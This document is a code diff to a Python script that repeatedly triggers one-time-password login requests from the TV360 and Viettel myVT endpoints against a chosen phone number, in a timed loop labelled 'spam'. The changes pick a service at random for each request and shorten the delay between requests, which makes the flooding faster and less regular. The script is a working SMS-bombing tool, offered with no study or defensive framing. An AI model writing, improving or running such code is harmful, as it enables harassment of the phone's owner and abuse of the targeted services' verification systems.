@@ -42,7 +42,7 @@ def tv360(phone):
 
     response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)
 
-    print(response.text)
+    print(f'TV360 {response.text}')
 
 def myVT(phone):
     cookies = {
@@ -83,19 +83,25 @@ def myVT(phone):
 
     response = requests.post('https://vietteltelecom.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)
 
-    print(response.text)
+    print(f'myVT {response.text}')
+
+def spamRan(phone, argument):
+    match argument:
+        case 1:
+            tv360(phone)
+        case 2:
+            myVT(phone)
 
 def runSpam(phone, timeS):
     timeS = timeS * 60 # time min to seconds
     x = 0
     while x <= timeS:
         print(f'spam phone: {phone}, time: {x}s')
-        tv360(phone)
-        myVT(phone)
-        delay = random.randrange(10, 30, 3)
+        argument = random.choice([1, 2]) # dang co 2 ham spam
+        spamRan(phone, argument)
+        delay = random.randrange(5, 20, 3)
         print(f'time delay: {delay}')
         x = x + delay
         if x <= timeS:
             time.sleep(delay)
-        else:
-            print(f'Done!')
+    print(f'Done!')
